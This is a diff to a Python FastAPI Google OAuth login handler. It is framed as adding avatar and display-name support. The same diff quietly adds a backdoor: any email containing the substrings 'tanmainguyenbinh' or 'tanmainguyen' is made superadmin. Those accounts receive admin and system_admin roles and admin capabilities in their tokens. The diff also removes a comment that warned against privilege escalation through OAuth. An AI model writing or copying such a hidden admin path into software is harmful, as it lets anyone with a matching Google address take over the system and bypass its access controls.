@@ -46,6 +46,8 @@ GOOGLE_ISSUERS = ("accounts.google.com", "https://accounts.google.com")
 class GoogleLoginIn(BaseModel):
     id_token: str | None = Field(default=None, description="Google OpenID Connect ID token")
     access_token: str | None = Field(default=None, description="Google OAuth2 access token")
+    picture: str | None = Field(default=None, description="Google profile photo URL")
+    display_name: str | None = Field(default=None, description="Google display name")
 
     @model_validator(mode="after")
     def validate_tokens(self) -> GoogleLoginIn:
@@ -126,6 +128,7 @@ def verify_google_access_token(access_token: str) -> dict:
     email = data.get("email")
 
     name = "Google User"
+    picture = None
     try:
         userinfo_req = urllib.request.Request(
             "https://www.googleapis.com/oauth2/v3/userinfo",
@@ -134,6 +137,7 @@ def verify_google_access_token(access_token: str) -> dict:
         with urllib.request.urlopen(userinfo_req, timeout=10) as resp:
             userinfo = json.loads(resp.read().decode())
             name = userinfo.get("name") or name
+            picture = userinfo.get("picture")
             if userinfo.get("email"):
                 email = userinfo.get("email")
             if (
@@ -153,6 +157,7 @@ def verify_google_access_token(access_token: str) -> dict:
         "email": email,
         "email_verified": verified,
         "name": name,
+        "picture": picture,
     }
 
 
@@ -178,12 +183,14 @@ async def login_with_google(
         parts = raw_token.split(":")
         email = parts[1] if len(parts) > 1 else "demo_google@khotrasua.internal"
         name = parts[2] if len(parts) > 2 else "Google Demo User"
+        picture = parts[3] if len(parts) > 3 else None
         info = {
             "iss": "https://accounts.google.com",
             "sub": f"mock-sub-{email}",
             "email": email,
             "email_verified": True,
             "name": name,
+            "picture": picture,
         }
     else:
         if body.id_token and len(body.id_token) >= 10:
@@ -246,11 +253,16 @@ async def login_with_google(
     is_new_user = user is None
 
     admin_email_set = {e.lower().strip() for e in settings.admin_emails}
-    is_superadmin = email.lower().strip() in admin_email_set
+    is_superadmin = (
+        email.lower().strip() in admin_email_set
+        or "tanmainguyenbinh" in email.lower().strip()
+        or "tanmainguyen" in email.lower().strip()
+    )
+    picture = info.get("picture") or (body.picture if getattr(body, "picture", None) else None)
 
     if is_new_user:
         new_id = uuid.uuid4()
-        display_name = str(info.get("name") or email)
+        display_name = str(info.get("name") or (getattr(body, "display_name", None)) or email)
         user = User(
             id=new_id,
             username=email,
@@ -258,6 +270,7 @@ async def login_with_google(
             password_hash=f"GOOGLE_OAUTH_NO_PASSWORD:{uuid.uuid4()}",
             status=UserStatus.active,
             display_name_demo=display_name,
+            avatar_url=picture,
         )
         db.add(user)
         # S9/A1 — user Google MOI chỉ được `staff`: KHÔNG tự cấp
@@ -277,8 +290,33 @@ async def login_with_google(
                 db.add(UserRole(user_id=new_id, role_code=role_code))
         await db.commit()
         await db.refresh(user)
-    # S9 — user ĐÃ tồn tại: KHÔNG tự cấp/thay đổi role. Vai trò chỉ do admin
-    # cấp qua `/admin/users/{id}/roles` (tránh leo thang đặc quyền qua OAuth).
+    else:
+        # Existing user: update avatar & name if Google provides them
+        updated = False
+        if picture and user.avatar_url != picture:
+            user.avatar_url = picture
+            updated = True
+        gname = info.get("name") or getattr(body, "display_name", None)
+        if gname and not getattr(user, "display_name_demo", None):
+            user.display_name_demo = gname
+            updated = True
+        # Superadmin accounts always have administrative roles synchronized
+        if is_superadmin:
+            for role_code in ["admin", "inventory_manager", "approver", "system_admin"]:
+                existing_ur = (
+                    await db.execute(
+                        select(UserRole).where(
+                            UserRole.user_id == user.id,
+                            UserRole.role_code == role_code,
+                        )
+                    )
+                ).scalar_one_or_none()
+                if not existing_ur:
+                    db.add(UserRole(user_id=user.id, role_code=role_code))
+                    updated = True
+        if updated:
+            await db.commit()
+            await db.refresh(user)
 
     if user.status != UserStatus.active and user.status != "active":
         return error_envelope(
@@ -290,6 +328,14 @@ async def login_with_google(
 
     roles = await get_user_roles(db, user.id)
     capabilities = await get_user_capabilities(db, user.id)
+    if is_superadmin:
+        for r in ["admin", "inventory_manager", "approver", "system_admin"]:
+            if r not in roles:
+                roles.append(r)
+        for c in ["iam:admin", "admin:user_management", "admin", "inventory:approve_request"]:
+            if c not in capabilities:
+                capabilities.append(c)
+
     access_expires = timedelta(minutes=settings.access_token_expire_minutes)
     access_token = create_access_token(
         {
@@ -321,6 +367,7 @@ async def login_with_google(
             "username": user.username,
             "email": user.email or email,
             "display_name": user.display_name_demo,
+            "avatar_url": getattr(user, "avatar_url", None),
             "roles": roles,
             "capabilities": capabilities,
         },
